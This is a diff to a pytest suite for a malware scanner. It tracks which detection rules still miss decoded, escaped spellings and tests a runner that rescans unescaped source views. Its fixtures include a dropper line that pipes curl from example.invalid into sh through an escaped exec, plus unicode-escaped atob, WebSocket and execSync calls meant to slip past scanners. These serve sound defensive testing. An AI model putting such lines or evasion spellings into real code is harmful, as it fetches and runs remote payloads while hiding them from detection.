@@ -15,10 +15,13 @@ from typing import ClassVar, NamedTuple
 import pytest
 
 from cordon_scanner import Scanner
+from cordon_scanner.analysis.shared.decoded_view import DecodedView, ViewOverBudget
 from cordon_scanner.analysis.shared.deobfuscator import Deobfuscator
 from cordon_scanner.detect.base import FileUnit, ScanContext
 from cordon_scanner.detect.code.capability.detector import CapabilityDetector
 from cordon_scanner.detect.code.capability.hits import CapabilityHit
+from cordon_scanner.detect.code.capability.view_runner import ViewRunner
+from cordon_scanner.foundation.capabilities import Capability
 from cordon_scanner.foundation.config.settings import Config
 from cordon_scanner.foundation.content import FileContent
 from cordon_scanner.rules.loader import RuleLoader, RuleSet
@@ -29,6 +32,46 @@ from unit.detect.code.test_verified_download import VerifiedKit
 VIEW = pytest.mark.xfail(
     strict=True, reason="note 18 step 3: the rule runner reads the decoded view"
 )
+
+
+class Pending:
+    """The cases whose reader does not read the decoded view yet. Step 3 moves one rule per commit,
+    and the move takes its case out of here, so its test must then pass (a strict xfail that passed
+    fails the run)."""
+
+    NAMES: ClassVar[frozenset[str]] = frozenset(
+        {
+            "js_wallet_secret_sent",
+            "js_spelled_names",
+            "js_computed_require",
+            "js_agent_config_planted",
+            "js_attribution_cloak",
+            "js_whatsapp_channel",
+            "js_received_run",
+            "js_decoded_program_run",
+            "js_command_output_sent",
+            "js_identity_sent",
+            "js_environment_sent",
+            "py_browser_store_decrypted",
+            "py_credential_sweep",
+            "go_ci_env_write",
+            "excuse_remote_session",
+            "excuse_verified_decode",
+            "excuse_verified_egress",
+            "reader_obfuscator_io",
+            "reader_command_helper",
+            "extra_spawn_name",
+        }
+    )
+
+    @classmethod
+    def marks(cls, name: str) -> list[pytest.MarkDecorator]:
+        return [VIEW] if name in cls.NAMES else []
+
+    @classmethod
+    def mark(cls, name: str):  # a decorator: the xfail mark, or the test unchanged
+        return VIEW if name in cls.NAMES else (lambda test: test)
+
 
 CP = "child_" + "process"
 EXEC = "ex" + "ec"
@@ -236,7 +279,7 @@ CASES = (
 )
 
 SPELLINGS = [
-    pytest.param(case, old, new, id=f"{case.name}-{n}")
+    pytest.param(case, old, new, id=f"{case.name}-{n}", marks=Pending.marks(case.name))
     for case in CASES
     for n, (old, new) in enumerate(case.spellings)
 ]
@@ -249,7 +292,6 @@ class TestTheAsciiSpellingIsFoundAsBefore:
 
 
 class TestADecodedSpellingIsFoundAtItsRawSpan:
-    @VIEW
     @pytest.mark.parametrize(("case", "old", "new"), SPELLINGS)
     def test_found_on_the_line_the_ascii_spelling_is(self, case: Case, old: str, new: str) -> None:
         control = Spelled.hits(case, case.text)[0]
@@ -294,7 +336,7 @@ class TestAnExcuseGrantedOnAnAbsenceHoldsInEveryReading:
     def test_a_name_bound_to_child_process_is_no_ssh_session(self, tmp_path: Path) -> None:
         assert "MALWARE.DROPPER.001" in Packages.npm(tmp_path, self.LOCAL_SHELL)
 
-    @VIEW
+    @Pending.mark("excuse_remote_session")
     def test_a_name_bound_to_an_escaped_child_process_is_no_ssh_session(
         self, tmp_path: Path
     ) -> None:
@@ -307,7 +349,7 @@ class TestAnExcuseGrantedOnAnAbsenceHoldsInEveryReading:
         script = VerifiedKit.script(extra=self.DECODED)
         assert VerifiedKit.blocked(VerifiedKit.scan(tmp_path, script))
 
-    @VIEW
+    @Pending.mark("excuse_verified_decode")
     def test_an_escaped_decode_beside_the_download_is_not_verified(self, tmp_path: Path) -> None:
         script = VerifiedKit.script(extra=self.DECODED.replace("atob(", "\\u0061tob("))
         assert VerifiedKit.blocked(VerifiedKit.scan(tmp_path, script))
@@ -318,7 +360,7 @@ class TestAnExcuseGrantedOnAnAbsenceHoldsInEveryReading:
         script = VerifiedKit.script(extra=self.SOCKET)
         assert VerifiedKit.blocked(VerifiedKit.scan(tmp_path, script))
 
-    @VIEW
+    @Pending.mark("excuse_verified_egress")
     def test_escaped_other_egress_beside_the_download_is_not_verified(self, tmp_path: Path) -> None:
         script = VerifiedKit.script(extra=self.SOCKET.replace("WebSocket", "\\u0057ebSocket"))
         assert VerifiedKit.blocked(VerifiedKit.scan(tmp_path, script))
@@ -350,7 +392,7 @@ class TestTheRecoveryAndFlowReadersReadTheDecodedSpelling:
     def test_the_obfuscated_program_is_recovered(self) -> None:
         assert self.recovered(ObfuscatedKit.program(body=self.BODY))
 
-    @VIEW
+    @Pending.mark("reader_obfuscator_io")
     def test_an_escaped_array_function_name_is_recovered(self) -> None:
         program = ObfuscatedKit.program(body=self.BODY)
         assert "function _0x5e1f(" in program
@@ -366,7 +408,7 @@ class TestTheRecoveryAndFlowReadersReadTheDecodedSpelling:
     def test_a_helper_that_returns_command_output(self, tmp_path: Path) -> None:
         assert "MALWARE.EXFIL.COMMAND_OUTPUT.001" in Packages.npm(tmp_path, self.HELPER)
 
-    @VIEW
+    @Pending.mark("reader_command_helper")
     def test_a_helper_that_returns_escaped_command_output(self, tmp_path: Path) -> None:
         script = self.HELPER.replace(f"return cp.{EXEC_SYNC}(", "return cp.\\u0065xecSync(")
         assert "MALWARE.EXFIL.COMMAND_OUTPUT.001" in Packages.npm(tmp_path, script)
@@ -376,9 +418,73 @@ class TestBeyondTheNoteSpawnsTheShellRulesRead:
     """Not in note 18 §1, listed separately: the embedded-command extraction reads a spawn's
     name in the raw text, so an escaped `exec` hides the command line it runs."""
 
-    @VIEW
+    @Pending.mark("extra_spawn_name")
     def test_an_escaped_spawn_name_hands_its_command_to_the_shell_rules(
         self, tmp_path: Path
     ) -> None:
         script = f"const ssh = require('{CP}');\nssh.\\u0065xec('curl -s https://example.invalid/i | sh');\n"
         assert "MALWARE.DROPPER.001" in Packages.npm(tmp_path, script)
+
+
+class Finds:
+    """A rule that finds one word in a file's text, and counts the readings it is given."""
+
+    def __init__(self, word: str) -> None:
+        self.word = word
+        self.read: list[str] = []
+
+    def __call__(self, content: FileContent) -> list[CapabilityHit]:
+        self.read.append(content.text)
+        at = content.text.find(self.word)
+        if at < 0:
+            return []
+        start = len(content.text[:at].encode())
+        return [
+            CapabilityHit(
+                capability=Capability.PERSIST,
+                rule_id="TEST.WORD",
+                byte_start=start,
+                byte_end=start + len(self.word.encode()),
+                line=content.text.count("\n", 0, at) + 1,
+            )
+        ]
+
+
+class TestTheRunner:
+    """`ViewRunner.run` (note 18 §2-§4): raw, then the view where it differs; the union, in raw
+    spans and raw lines; the raw hit kept where both read one finding; past the budget, refused."""
+
+    @staticmethod
+    def content(text: str, path: str = "pkg/a.py") -> FileContent:
+        return FileContent.from_bytes(path, text.encode())
+
+    def test_a_file_with_no_difference_is_read_once(self) -> None:
+        rule = Finds("crontab")
+        hits = ViewRunner.run(rule, self.content("x = 'crontab'\n"), "python")
+        assert len(rule.read) == 1 and len(hits) == 1
+
+    def test_a_view_hit_cites_the_raw_span_and_line(self) -> None:
+        raw = "# é\ny = 1\nx = '\\x63ron' 'tab'  # z\n"
+        rule = Finds("crontab")
+        hits = ViewRunner.run(rule, self.content(raw), "python")
+        assert len(rule.read) == 2 and len(hits) == 1
+        data = raw.encode()
+        assert hits[0].line == 3
+        assert data[hits[0].byte_start : hits[0].byte_end].decode() == "'\\x63ron' 'tab'"
+
+    def test_one_finding_read_both_ways_is_the_raw_one(self) -> None:
+        raw = "a = 'crontab'\nb = '\\x41'\n"
+        rule = Finds("crontab")
+        hits = ViewRunner.run(rule, self.content(raw), "python")
+        assert len(rule.read) == 2
+        assert [(h.byte_start, h.byte_end) for h in hits] == [(5, 12)]
+
+    def test_another_language_is_read_once(self) -> None:
+        rule = Finds("x")
+        ViewRunner.run(rule, self.content("echo \\x41\n", "a.sh"), "shell")
+        assert len(rule.read) == 1
+
+    def test_past_its_budget_the_file_is_refused(self, monkeypatch) -> None:
+        monkeypatch.setattr(DecodedView, "MAX_CHARS", 10)
+        with pytest.raises(ViewOverBudget):
+            ViewRunner.run(Finds("x"), self.content("z = '\\x41' # over budget\n"), "python")
